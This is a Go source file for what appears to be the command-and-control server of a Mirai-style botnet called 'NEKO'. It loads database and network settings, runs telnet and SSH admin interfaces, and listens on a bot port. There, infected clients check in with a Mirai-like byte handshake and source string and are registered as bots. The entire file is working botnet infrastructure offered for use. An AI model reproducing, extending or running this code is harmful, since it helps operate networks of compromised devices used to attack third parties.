package main

import (
    "fmt"
    "net"
    "errors"
    "strings"
    "time"
    "github.com/tidwall/gjson"
    "io/ioutil"
)

/* MYSQL */
var DatabaseAddr  string = loadconfig("mysql.host")
var DatabaseUser  string = loadconfig("mysql.user")
var DatabasePass  string = loadconfig("mysql.password")
var DatabaseTable string = loadconfig("mysql.table")
var database *Database = NewDatabase(DatabaseAddr, DatabaseUser, DatabasePass, DatabaseTable)
/* BOUND PORTS */
var TelnetAdrr    string
var SshPort       string
var BotAdrr      string
/**/

var clientList *ClientList = NewClientList()

func main() {
    redconfig, err := ioutil.ReadFile("config.json")
    if err != nil {
        fmt.Println("ERROR\nconfig.json not found!\n")
    }
    configfil := string(redconfig)
    TelnetPort := (gjson.Get(configfil, "network.telnet_port")).String()
    SshPort := (gjson.Get(configfil, "network.ssh_port")).String()
    BotPort := (gjson.Get(configfil, "network.bot_port")).String()
    ServAddr := (gjson.Get(configfil, "network.address")).String()
    TelnetAdrr := ServAddr+":"+TelnetPort
    SshAdrr := ServAddr+":"+SshPort
    BotAdrr := ServAddr+":"+BotPort
    _,_,_ = TelnetAdrr, SshAdrr, BotAdrr
    fmt.Println("[NEKO:config] congif.json loaded!")

    tel, err := net.Listen("tcp", TelnetAdrr)
    if err != nil {
        fmt.Println(err)
        return
    }
    go sshserver(SshPort)
    fmt.Println("[NEKO:network] ssh server started!")
    bot, err := net.Listen("tcp", BotAdrr)
    if err != nil {
        fmt.Println(err)
        return
    }
    fmt.Println("[NEKO:network] tcp command server started!")
    go func() {
        for{
            conn, err := bot.Accept()
            if err != nil {
                break
            }
            go initialHandler(conn)
        }
    }()
    
    fmt.Println("[NEKO:network] telnet server started!")
    for {
        conn, err := tel.Accept()
        if err != nil {
            break
        }
        go UserHandler(conn)
    }
    fmt.Println("Killed!")
}

func initialHandler(conn net.Conn) {
    defer conn.Close()
    conn.SetDeadline(time.Now().Add(time.Millisecond * 900))

    buf := make([]byte, 32)
    l, err := conn.Read(buf)
    if err != nil || l <= 0 {
        return
    }
    
/*
00000000  00 00 00 01 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000010  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|

{0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00,   0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
*/
    if l == 4 && buf[0] == 0x00 && buf[1] == 0x00 && buf[2] == 0x00 && buf[3] == 0x01 {
        if buf[3] > 0 {
            string_len := make([]byte, 1)
            //fmt.Printf("%s\n", hex.Dump(buf))
            //fmt.Sprintf("%x %x %x",buf[0],buf[1],buf[2])
            l, err := conn.Read(string_len)
            if err != nil || l <= 0 {
                return
            }
            var source string
            if string_len[0] > 0 {
                source_buf := make([]byte, string_len[0])
                l, err := conn.Read(source_buf)
                if err != nil || l <= 0 {
                    return
                }
                source = string(source_buf)
            }
            NewBot(conn, buf[3], source).Handle()
        } else {
            NewBot(conn, buf[3], "").Handle()
        }
    } else {
        baddr := strings.Split(conn.RemoteAddr().String(), ":")
        fmt.Printf("[NEKO:network] %s failed\n", baddr[0])
        return
        //NewAdmin(conn).Handle()
    }
}

func UserHandler(conn net.Conn) {
    defer conn.Close()

    conn.SetDeadline(time.Now().Add(10 * time.Second))

    buf := make([]byte, 32)
    l, err := conn.Read(buf)
    if err != nil || l <= 0 {
        return
    }
    baddr := strings.Split(conn.RemoteAddr().String(), ":")
    fmt.Println("[NEKO:network] "+baddr[0]+" admin!")
    NewAdmin(conn).Handle()
}

func readXBytes(conn net.Conn, buf []byte) (error) {
    tl := 0

    for tl < len(buf) {
        n, err := conn.Read(buf[tl:])
        if err != nil {
            return err
        }
        if n <= 0 {
            return errors.New("Connection closed unexpectedly")
        }
        tl += n
    }

    return nil
}

func netshift(prefix uint32, netmask uint8) uint32 {
    return uint32(prefix >> (32 - netmask))
}
